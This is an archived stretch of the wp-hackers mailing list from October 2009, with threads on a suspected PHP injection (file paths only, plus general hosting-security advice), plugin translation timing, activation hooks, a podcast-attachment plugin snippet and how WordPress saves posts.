Subject: [wp-hackers] Weird PHP Injection
In-Reply-To: <161617690910291254w616be287kcb94fe67a6f4d940@mail.gmail.com>
References: <160203ed0910291245h7eac276em3a1af771fb8abbaf@mail.gmail.com> 
	<161617690910291254w616be287kcb94fe67a6f4d940@mail.gmail.com>
Message-ID: <160203ed0910291323n21bdd9f8ufc9fa35c651020aa@mail.gmail.com>

Thanks Otto,

It's actually a rackspace managed server, not exactly shared hosting, only
semi-shared. In the sense that each site they own is a virtual server. So it
would only have access to the files on this particular virtualization.

I did another grep for "base64" which yielded some interesting results.
These three files in particular:
wp-content/plugins/wp-phpmyadmin/phpmyadmin/pmd/styles/default/images/dg.php
wp-content/plugins/wp-phpmyadmin/phpmyadmin/pmd/styles/default/images/s.php
wp-content/plugins/wp-phpmyadmin/phpmyadmin/pmd/styles/default/images/style.css.php

So there is a ton more encoded code in those files, but again, since this is
located in the phpMyAdmin plugin dir for WP, it makes me think that it is an
exploit in that particular plugin -- of course, it could just be a
coincidence.

Chris,

Yeah, the only reason we noticed was because the code actually screwed up
the formatting for wp-admin. Like it was missing a </div> or something.

Lew Ayotte
Full Throttle Development, LLC
706.363.0688
478.246.4627
lew at fullthrottledevelopment.com
http://fullthrottledevelopment.com
http://twitter.com/full_throttle
http://twitter.com/lewayotte


On Thu, Oct 29, 2009 at 3:54 PM, Otto <otto at ottodestruct.com> wrote:

> On Thu, Oct 29, 2009 at 2:45 PM, Lew Ayotte - Full Throttle
> Development <lew at fullthrottledevelopment.com> wrote:
> > I'm not sure if anyone has seen this before... except for this guy:
> > http://wordpress.org/support/topic/320918?replies=8
> >
> > But I just ran into an issue with a client using WP2.8.4. It seems like
> > every single file in WP (including themes and plugins) had this injected
> at
> > the top:
>
> In the cases where I've seen all files hit like this, then I've always
> discovered two things.
>
> 1. The server is a shared host (many websites, same server).
> 2. The server itself is insecure (the web user can easily write to all
> the web facing files).
>
> The usual method of entry is for some site (any site) on that shared
> server to get hacked. The attacker then runs a piece of code which
> simply recursively searches all sites on that system and adds its
> malicious code to them all that fit some pattern (like *.php, for
> example).
>
> Well setup shared servers don't have this problem. A server running
> suPHP, for example, would prevent this sort of attack because the php
> processes run under the user account, not the generic web account. So
> when the attacker gains privileges, he's running as the generic user
> who doesn't have the same kind of access that the "web" user does.
>
> My advice: Switch hosts. A host that can't properly configure their
> systems is not one worth sticking with.
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From liste at srpski.biz  Thu Oct 29 21:20:07 2009
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Thu, 29 Oct 2009 22:20:07 +0100
Subject: [wp-hackers] Why strings aren't translated here?
Message-ID: <9b6c20460910291420y1d0419e8v15af8d3aab9ac75b@mail.gmail.com>

I have a problem with my plugin (
http://wordpress.org/extend/plugins/gravatar-signup-encouragement/ ). Two
strings aren't translated with gettext even though they are in po/mo files.
First one is text of message (line 71) which is made only on activation
(line 93) and later is saved in database. Second is URL to locale version of
Gravatar (line 58). In both cases untranslated strings are shown.

Does anyone know what is problem with them?

Thanks in advance

From scribu at gmail.com  Thu Oct 29 21:20:23 2009
From: scribu at gmail.com (scribu)
Date: Thu, 29 Oct 2009 23:20:23 +0200
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>
References: <5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>
Message-ID: <349fe48b0910291420t2166a30fl45a55ab74e69b15b@mail.gmail.com>

Finally updated the Codex example, using jQuery.

-- 
http://scribu.net

From mark at watero.us  Thu Oct 29 21:23:39 2009
From: mark at watero.us (mark waterous)
Date: Thu, 29 Oct 2009 14:23:39 -0700
Subject: [wp-hackers] Hook being called twice on activate,
	once on deactivate
In-Reply-To: <4AE9F291.8060703@gaarai.com>
References: <001101ca58cd$61f3d470$25db7d50$@us> <4AE9F291.8060703@gaarai.com>
Message-ID: <001b01ca58de$16241d50$426c57f0$@us>

I appreciate the comments, but the plugin itself doesn't use
call_user_func(), I simply did that in the test as a way to pass an argument
to the function. It was meant to be a quick and dirty test, I wasn't really
priding myself on the coding style in that sample - the root of the problem
was the scope during activation as Otto informed me.

Thank you for also pointing out however that call_user_func is executing
every time the file is accessed, it's not a function I've used very much in
the past, and I will make sure the same mistake isn't made twice.
- Mark

> -----Original Message-----
> Sent: Thursday, October 29, 2009 12:53 PM
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Hook being called twice on activate, once on
> deactivate
> 
> Frankly, your code is a mess.


From peter.westwood at ftwr.co.uk  Thu Oct 29 21:25:21 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Thu, 29 Oct 2009 21:25:21 +0000
Subject: [wp-hackers] Why strings aren't translated here?
In-Reply-To: <9b6c20460910291420y1d0419e8v15af8d3aab9ac75b@mail.gmail.com>
References: <9b6c20460910291420y1d0419e8v15af8d3aab9ac75b@mail.gmail.com>
Message-ID: <731931D6-D550-429F-B18C-7F5097DE020A@ftwr.co.uk>


On 29 Oct 2009, at 21:20, Milan Dini? wrote:

> I have a problem with my plugin (
> http://wordpress.org/extend/plugins/gravatar-signup- 
> encouragement/ ). Two
> strings aren't translated with gettext even though they are in po/mo  
> files.
> First one is text of message (line 71) which is made only on  
> activation
> (line 93) and later is saved in database. Second is URL to locale  
> version of
> Gravatar (line 58). In both cases untranslated strings are shown.
>
> Does anyone know what is problem with them?

You are calling the translation functions before you load you  
translation files.

You call the translation for these when the plugin is included but  
load the file on the 'init' hook which runs afterwards.

Hope that helps
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From liste at srpski.biz  Thu Oct 29 21:35:23 2009
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Thu, 29 Oct 2009 22:35:23 +0100
Subject: [wp-hackers] Why strings aren't translated here?
In-Reply-To: <731931D6-D550-429F-B18C-7F5097DE020A@ftwr.co.uk>
References: <9b6c20460910291420y1d0419e8v15af8d3aab9ac75b@mail.gmail.com>
	<731931D6-D550-429F-B18C-7F5097DE020A@ftwr.co.uk>
Message-ID: <9b6c20460910291435t33ec92f7iaeb10473463873fd@mail.gmail.com>

Thank you for quick answer. So when should I load textdomain?

2009/10/29 Peter Westwood <peter.westwood at ftwr.co.uk>

>
> On 29 Oct 2009, at 21:20, Milan Dini? wrote:
>
>  I have a problem with my plugin (
>> http://wordpress.org/extend/plugins/gravatar-signup-encouragement/ ). Two
>> strings aren't translated with gettext even though they are in po/mo
>> files.
>> First one is text of message (line 71) which is made only on activation
>> (line 93) and later is saved in database. Second is URL to locale version
>> of
>> Gravatar (line 58). In both cases untranslated strings are shown.
>>
>> Does anyone know what is problem with them?
>>
>
> You are calling the translation functions before you load you translation
> files.
>
> You call the translation for these when the plugin is included but load the
> file on the 'init' hook which runs afterwards.
>
> Hope that helps
> --
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From marvinc at gmail.com  Fri Oct 30 01:46:23 2009
From: marvinc at gmail.com (MarvinC)
Date: Thu, 29 Oct 2009 21:46:23 -0400
Subject: [wp-hackers] Menu that links to specific content
In-Reply-To: <65b196650910290731m888bf21r46883c3086cf7755@mail.gmail.com>
References: <604360770910290723m1c0ef595la84e98d46f6e04f6@mail.gmail.com>
	<65b196650910290731m888bf21r46883c3086cf7755@mail.gmail.com>
Message-ID: <604360770910291846m2d6a8608maa620ed79aee6bd1@mail.gmail.com>

WOW! This gave errors once activated so I'll check the authors website.

Thanks

On Thu, Oct 29, 2009 at 10:31 AM, Simon Blackbourn <piemanek at gmail.com>wrote:

> 2009/10/29 MarvinC <marvinc at gmail.com>
>
> >d.
>


> My apologies in advance if this isn't a "hack request" but I'm in need of a
> > way to create a menu containing links that point to specific content on a
> > page. The content on most of the pages on a client site is long so what
> > they
> > request is the ability for the user to click to be taken to a specific
> area
> > of the page, like so:
> > Link 1: Overview
> > Link 2: History
> > Link 3: Middle of Page
> > Link 4: Last Paragraph of Page
> >
> >
> http://hackadelic.com/solutions/wordpress/toc-boxes automatically
> generates
> a 'table of contents' for a post/page from the headers (h1, h2, etc) in the
> content.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Fri Oct 30 15:58:11 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 30 Oct 2009 10:58:11 -0500
Subject: [wp-hackers] Why strings aren't translated here?
In-Reply-To: <9b6c20460910291435t33ec92f7iaeb10473463873fd@mail.gmail.com>
References: <9b6c20460910291420y1d0419e8v15af8d3aab9ac75b@mail.gmail.com> 
	<731931D6-D550-429F-B18C-7F5097DE020A@ftwr.co.uk>
	<9b6c20460910291435t33ec92f7iaeb10473463873fd@mail.gmail.com>
Message-ID: <161617690910300858n442e9e66mcc3d1af2b17e039e@mail.gmail.com>

You're loading the textdomain properly (at init), but you're trying to
translate those strings too early. Remove them from the "main body" of
the function, and add them to a function somewhere.

Basically, you shouldn't generally do anything in the main body of a
plugin that requires WordPress to be fully loaded, because your plugin
is included before a lot of stuff happens. Always try to put stuff
into functions, then hook those in at the right places.

And honestly, you're doing some strange and seemingly unnecessary
stuff here. Here's an example of what I mean:

You translate this string into a global variable:
$gse_tip_text_unformated = sprintf(__("It seems that you don't have an
avatar on Gravatar. Click <a href='%s' target='_blank'>here</a> to
make one.", "gse_textdomain"), $gse_url_placeholder);

Then, later, in a function, you use it (again, global variable):
$gse_options['tip_text'] = $gse_tip_text_unformated;

But that's the only place you ever use it. Why in the world make a
global variable to hold it at all? Why put it in the main body? Why
not just do this?
$gse_options['tip_text'] = sprintf(__("It seems that you don't have an
avatar on Gravatar. Click <a href='%s' target='_blank'>here</a> to
make one.", "gse_textdomain"), $gse_url_placeholder);

Translation works anywhere. Don't use globals that you don't have to
use. Translate only when you actually need to do the translation,
don't pre-translate stuff early. Hey, you may not even need those
strings, so translating them early is a waste of time and resources.
The way you're doing it now, all those strings get translated on every
single page load, even if the strings are never even used (like,
you're not displaying the admin screen). It's wholly unnecessary to do
all that stuff.

Eliminate these globals. Move translations to the point at which
they're needed. Save yourself a lot of trouble.

-Otto



On Thu, Oct 29, 2009 at 4:35 PM, Milan Dini? <liste at srpski.biz> wrote:
> Thank you for quick answer. So when should I load textdomain?
>
> 2009/10/29 Peter Westwood <peter.westwood at ftwr.co.uk>
>
>>
>> On 29 Oct 2009, at 21:20, Milan Dini? wrote:
>>
>> ?I have a problem with my plugin (
>>> http://wordpress.org/extend/plugins/gravatar-signup-encouragement/ ). Two
>>> strings aren't translated with gettext even though they are in po/mo
>>> files.
>>> First one is text of message (line 71) which is made only on activation
>>> (line 93) and later is saved in database. Second is URL to locale version
>>> of
>>> Gravatar (line 58). In both cases untranslated strings are shown.
>>>
>>> Does anyone know what is problem with them?
>>>
>>
>> You are calling the translation functions before you load you translation
>> files.
>>
>> You call the translation for these when the plugin is included but load the
>> file on the 'init' hook which runs afterwards.
>>
>> Hope that helps
>> --
>> Peter Westwood
>> http://blog.ftwr.co.uk | http://westi.wordpress.com
>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From liste at srpski.biz  Fri Oct 30 21:20:31 2009
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Fri, 30 Oct 2009 22:20:31 +0100
Subject: [wp-hackers] Why strings aren't translated here?
In-Reply-To: <161617690910300858n442e9e66mcc3d1af2b17e039e@mail.gmail.com>
References: <9b6c20460910291420y1d0419e8v15af8d3aab9ac75b@mail.gmail.com>
	<731931D6-D550-429F-B18C-7F5097DE020A@ftwr.co.uk>
	<9b6c20460910291435t33ec92f7iaeb10473463873fd@mail.gmail.com>
	<161617690910300858n442e9e66mcc3d1af2b17e039e@mail.gmail.com>
Message-ID: <9b6c20460910301420k7fdcccdq3b71438237d01d38@mail.gmail.com>

Thank you for your detailed answer. I'm not sure why I started using global
variable for translation but I think it was because I tried various ways to
make translation working and none succeed so trial with variables was last
one.

Now I tried what you suggested ( $gse_options['tip_text'] = sprintf(__("It
seems that ... ) but it still doesn't translate that string. Maybe is
problem because it is run in register_activation_hook. You can see that for
yourself if you uninstall plugin and rename sr_RS.mo file to en_US.mo file
and see that on activation original string is saved in database and not
translated one, while other strings in settings page are translated.

Thanks again.

2009/10/30 Otto <otto at ottodestruct.com>

> You're loading the textdomain properly (at init), but you're trying to
> translate those strings too early. Remove them from the "main body" of
> the function, and add them to a function somewhere.
>
> Basically, you shouldn't generally do anything in the main body of a
> plugin that requires WordPress to be fully loaded, because your plugin
> is included before a lot of stuff happens. Always try to put stuff
> into functions, then hook those in at the right places.
>
> And honestly, you're doing some strange and seemingly unnecessary
> stuff here. Here's an example of what I mean:
>
> You translate this string into a global variable:
> $gse_tip_text_unformated = sprintf(__("It seems that you don't have an
> avatar on Gravatar. Click <a href='%s' target='_blank'>here</a> to
> make one.", "gse_textdomain"), $gse_url_placeholder);
>
> Then, later, in a function, you use it (again, global variable):
> $gse_options['tip_text'] = $gse_tip_text_unformated;
>
> But that's the only place you ever use it. Why in the world make a
> global variable to hold it at all? Why put it in the main body? Why
> not just do this?
> $gse_options['tip_text'] = sprintf(__("It seems that you don't have an
> avatar on Gravatar. Click <a href='%s' target='_blank'>here</a> to
> make one.", "gse_textdomain"), $gse_url_placeholder);
>
> Translation works anywhere. Don't use globals that you don't have to
> use. Translate only when you actually need to do the translation,
> don't pre-translate stuff early. Hey, you may not even need those
> strings, so translating them early is a waste of time and resources.
> The way you're doing it now, all those strings get translated on every
> single page load, even if the strings are never even used (like,
> you're not displaying the admin screen). It's wholly unnecessary to do
> all that stuff.
>
> Eliminate these globals. Move translations to the point at which
> they're needed. Save yourself a lot of trouble.
>
> -Otto
>
>
>
> On Thu, Oct 29, 2009 at 4:35 PM, Milan Dini? <liste at srpski.biz> wrote:
> > Thank you for quick answer. So when should I load textdomain?
> >
> > 2009/10/29 Peter Westwood <peter.westwood at ftwr.co.uk>
> >
> >>
> >> On 29 Oct 2009, at 21:20, Milan Dini? wrote:
> >>
> >>  I have a problem with my plugin (
> >>> http://wordpress.org/extend/plugins/gravatar-signup-encouragement/ ).
> Two
> >>> strings aren't translated with gettext even though they are in po/mo
> >>> files.
> >>> First one is text of message (line 71) which is made only on activation
> >>> (line 93) and later is saved in database. Second is URL to locale
> version
> >>> of
> >>> Gravatar (line 58). In both cases untranslated strings are shown.
> >>>
> >>> Does anyone know what is problem with them?
> >>>
> >>
> >> You are calling the translation functions before you load you
> translation
> >> files.
> >>
> >> You call the translation for these when the plugin is included but load
> the
> >> file on the 'init' hook which runs afterwards.
> >>
> >> Hope that helps
> >> --
> >> Peter Westwood
> >> http://blog.ftwr.co.uk | http://westi.wordpress.com
> >> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
> >>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From xrdawson at gmail.com  Sat Oct 31 07:41:27 2009
From: xrdawson at gmail.com (Chris Dawson)
Date: Sat, 31 Oct 2009 00:41:27 -0700
Subject: [wp-hackers] command line script to add "pending" item with podcast
	attachment?
Message-ID: <659b9ea30910310041i6cb1a224k53b4402ba28fe61f@mail.gmail.com>

I'm trying to write a plugin or command-line script that will allow an
external process to create a new post in my wordpress blog and have the new
item marked as pending.  I want to have this process create the post for a
user in the system, and then let the user review the post before it is
published.  I'm reviewing the Wordpress API, but am not sure where I should
start looking on design choices for implementing this.  Does anyone have a
suggestion on how I should implement this, or what pitfalls to avoid?

Truth be told, I'd prefer to write a script that publishes using ATOM.  And,
I think I have this working.  However, I need to modify the attachments as
stored by the powerpress podcast plugin, and am not sure how to make the
wordpress API work within that.  Perhaps I should modify the database by
hand?  Or, should I do this another way?

I've got a plugin like this so far:

<?php
function update_title_for_podcast($title) {
/* determine the podcast id */
  $postid = get_the_ID();
  $matches;
  if( preg_match( "/podcast=(.*)/", $title, $matches ) ) {
    $podcast_id = $matches[0];
    }
  $filename = "http://www.blahblah.com/podcasts/" . $podcast_id .
".wav.mp3";
  $attachment = array( 'post_title' => 'New podcast', 'post_content' => '',
'post_status' => '' );
  $attach_id = wp_insert_attachment( $attachment, $filename, $postid );
  $attach_data = wp_generate_attachment_metadata( $attach_id, $filename );
  $foo = wp_update_attachment_metadata( $attach_id,  $attach_data );
  return "Now with podcast: $title";
}

add_filter('the_title', 'update_title_for_podcast');
?>

Thanks,
Chris

-- 
Chris Dawson
971-533-8335

From ceo at kettlewell.net  Sat Oct 31 17:25:29 2009
From: ceo at kettlewell.net (Matthew Kettlewell)
Date: Sat, 31 Oct 2009 10:25:29 -0700
Subject: [wp-hackers] How are Posts saved?
Message-ID: <4AEC7309.50604@kettlewell.net>

I'm going through wp-admin/post.php to figure out how a post is saved.

The action appears to be 'editpost' which grabs the post_ID, calls 
redirect_post() and then wp_redirect() with an appended message  that 
the  file was saved.

I don't honestly understand how wp_redirect() is redirecting to post.php 
becauce in redirect_post() the location is set only to the appended 
message.  Is there a global var that I'm missing with the referrer 
information?

Where is the call to actually save the post?  I think I'm missing 
something...

-- 
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
Matthew Kettlewell - aka "The Dominator"
O: 970-985-4192
C: 970-261-2684
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~

http://www.BloggingEmergency.com/



From ceo at kettlewell.net  Sat Oct 31 18:43:20 2009
From: ceo at kettlewell.net (Matthew Kettlewell)
Date: Sat, 31 Oct 2009 11:43:20 -0700
Subject: [wp-hackers] How are Posts saved?
In-Reply-To: <4AEC7309.50604@kettlewell.net>
References: <4AEC7309.50604@kettlewell.net>
Message-ID: <4AEC8548.9020405@kettlewell.net>

I figured out how posts are being saved, and it was my misunderstanding 
of add_query_arg()

I'm new to wordpress core, so I may have a few oddball questions like 
this.... to better understand core for plugin dev and possibly core 
patches/enhancements.

is this the right forum to ask these sorts of questions?

Matt

~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~
Matthew Kettlewell - aka "The Dominator"
O: 970-985-4192
C: 970-261-2684
~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~

http://www.BloggingEmergency.com/


Matthew Kettlewell wrote:
> I'm going through wp-admin/post.php to figure out how a post is saved.
>
> The action appears to be 'editpost' which grabs the post_ID, calls 
> redirect_post() and then wp_redirect() with an appended message  that 
> the  file was saved.
>
> I don't honestly understand how wp_redirect() is redirecting to 
> post.php becauce in redirect_post() the location is set only to the 
> appended message.  Is there a global var that I'm missing with the 
> referrer information?
>
> Where is the call to actually save the post?  I think I'm missing 
> something...
>

From scribu at gmail.com  Sat Oct 31 20:46:48 2009
From: scribu at gmail.com (scribu)
Date: Sat, 31 Oct 2009 22:46:48 +0200
Subject: [wp-hackers] How are Posts saved?
In-Reply-To: <4AEC8548.9020405@kettlewell.net>
References: <4AEC7309.50604@kettlewell.net> <4AEC8548.9020405@kettlewell.net>
Message-ID: <349fe48b0910311346ta9e58d3od4213d91f55da8a7@mail.gmail.com>

On Sat, Oct 31, 2009 at 8:43 PM, Matthew Kettlewell <ceo at kettlewell.net>wrote:

> I'm new to wordpress core, so I may have a few oddball questions like
> this.... to better understand core for plugin dev and possibly core
> patches/enhancements.
>
> is this the right forum to ask these sorts of questions?
>

Yes, you're in the right place. Welcome!


-- 
http://scribu.net

